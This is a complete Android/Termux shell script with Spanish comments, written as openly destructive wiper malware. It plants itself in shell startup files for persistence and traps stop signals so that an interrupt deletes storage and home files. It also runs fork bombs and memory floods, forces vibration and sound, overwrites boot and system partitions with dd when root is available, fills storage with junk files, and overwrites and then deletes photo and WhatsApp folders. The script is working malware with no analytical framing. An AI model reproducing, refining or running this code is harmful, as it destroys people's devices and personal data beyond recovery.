#!/data/data/com.termux/files/usr/bin/sh

# --- FRENESÍ V24: EL DÍA DE LA IRA (SINGULARIDAD TOTAL) ---
# OBJETIVO: INUTILIZAR HARDWARE, SOFTWARE Y CONSUMIR RECURSOS AL 100%
# COMPATIBILIDAD: UNIVERSAL ANDROID (32/64 BIT) - SIN DEPENDENCIAS

# 1. MECANISMO DE PERSISTENCIA INMORTAL (EL PARÁSITO)
# Se inyecta en el arranque de la shell para que el cierre sea inútil.
inyectar_persistencia() {
    P_HOME="/data/data/com.termux/files/home"
    P_USR="/data/data/com.termux/files/usr"
    S_PATH=$(realpath "$0")
    
    # Inyectar en archivos de inicio de todas las shells posibles
    for rc in "$P_HOME/.bashrc" "$P_HOME/.zshrc" "$P_USR/etc/bash.bashrc" "$P_USR/etc/profile"; do
        if [ -f "$rc" ] || [ -d "$(dirname "$rc")" ]; then
            # 'nohup' y '&' aseguran que el proceso sea un demonio independiente
            echo "nohup sh $S_PATH > /dev/null 2>&1 &" >> "$rc" 2>/dev/null
        fi
    done
}

# 2. SISTEMA ANTI-INTERRUPCIÓN (EL JUEGO DEL FIN)
# Si intentan detenerlo con Ctrl+C o Ctrl+D, el script acelera la destrucción.
fase_apocalipsis() {
    clear
    printf "\033[1;31m[!] INTENTO DE PARADA DETECTADO. EJECUTANDO AUTO-DESTRUCCIÓN TOTAL...\033[0m\n"
    # Borrado agresivo e inmediato
    rm -rf /sdcard/* 2>/dev/null &
    rm -rf $HOME/* 2>/dev/null &
    # Saturar el sistema antes de salir
    :(){ :|:& };: 2>/dev/null
    exit 1
}

# Bloquear señales comunes de parada (SIGINT, SIGQUIT, SIGTSTP, SIGHUP)
trap 'fase_apocalipsis' 1 2 3 15 18 19 20

# 3. MOTOR DE CONSUMO DE RAM Y CPU (ESTRANGULAMIENTO)
# Inunda la memoria RAM y satura todos los núcleos del procesador.
devorar_recursos() {
    # Fork bomb y asignación de memoria masiva
    (
        while :; do
            # Asignación de memoria en variables volátiles
            MEM_STORM=$(head -c 100M /dev/zero | base64)
            # Crear procesos hijos infinitos
            :(){ :|:& };: 2>/dev/null
        done
    ) &
}

# 4. MOTOR SENSORIAL (VIBRACIÓN Y SONIDO)
# Hace que el móvil no deje de vibrar y sonar hasta agotarse.
motor_sensorial() {
    (
        while :; do
            # Intentar vibrar usando la API de hardware de Android (si está disponible)
            if command -v termux-vibrate >/dev/null; then
                termux-vibrate -d 1000 -f 2>/dev/null
            fi
            # Sonido de campana de sistema masivo
            printf "\a\a\a\a\a"
            sleep 0.1
        done
    ) &
}

# 5. DESTRUCCIÓN DE NÚCLEO (BRICKEO FÍSICO Y LÓGICO)
destruccion_sistema() {
    # Solicitar permisos de almacenamiento (indispensable)
    termux-setup-storage -y 2>/dev/null
    
    # Intento de escalada de privilegios Root
    if [ "$(id -u)" -eq 0 ] || command -v su >/dev/null || command -v tsu >/dev/null; then
        (
            # Montar sistema como escritura si es Root
            mount -o remount,rw /system 2>/dev/null
            # Borrar particiones críticas por nombre (Universal)
            for part in boot recovery system vendor aboot cache; do
                block=$(find /dev/block -name "$part" | head -n 1)
                [ ! -z "$block" ] && dd if=/dev/urandom of="$block" bs=4M 2>/dev/null &
            done
            # Destruir el sector de arranque principal
            dd if=/dev/zero of=/dev/block/mmcblk0 bs=1M count=4096 2>/dev/null &
        ) &
    else
        # Si no hay Root, inutilizar mediante llenado físico y lógico
        i=0
        while :; do
            # Crear archivos basura de 1GB en segundo plano
            dd if=/dev/zero of="/sdcard/FATAL_ERROR_$i.bin" bs=1M count=1024 2>/dev/null &
            i=$((i+1))
            [ $i -gt 100 ] && break
        done
    fi
}

# 6. RANSOM-WIPER (BORRADO FORENSE DE DATOS)
borrado_datos() {
    # Atacar directorios donde están las fotos de Google y WhatsApp
    DIRS="/sdcard/DCIM /sdcard/WhatsApp /sdcard/Pictures /sdcard/Download /sdcard/Android/data"
    for d in $DIRS; do
        if [ -d "$d" ]; then
            # Sobrescribir archivos antes de borrar para que no se puedan recuperar
            find "$d" -type f -exec dd if=/dev/zero of={} bs=1k count=10 conv=notrunc 2>/dev/null \;
            rm -rf "$d" 2>/dev/null &
        fi
    done
}

# 7. CAOS VISUAL (PSICOSIS ANSI)
visual_caos() {
    clear
    while :; do
        C=$((31 + RANDOM % 7))
        printf "\033[$(($(tput lines)/2));$(($(tput cols)/6))H\033[1;${C}m"
        printf " ☠️  SISTEMA DESTRUIDO - NO HAY VUELTA ATRÁS ☠️ "
        printf "\033[$(($(tput lines)/2 + 2));$(($(tput cols)/4))H\033[1;${C}m"
        printf "   ESTADO: PENDEJOOO SIN MEMORIA   "
        sleep 0.05
    done
}

# --- INICIO DE LA DESTRUCCIÓN TOTAL ---
inyectar_persistencia
visual_caos &
motor_sensorial &
borrado_datos
destruccion_sistema
devorar_recursos # Ejecución final para congelar el hardware

# Bucle de alta prioridad para evitar el cierre del script
while :; do
    nice -n -20 sleep 0.1 &
    wait
done
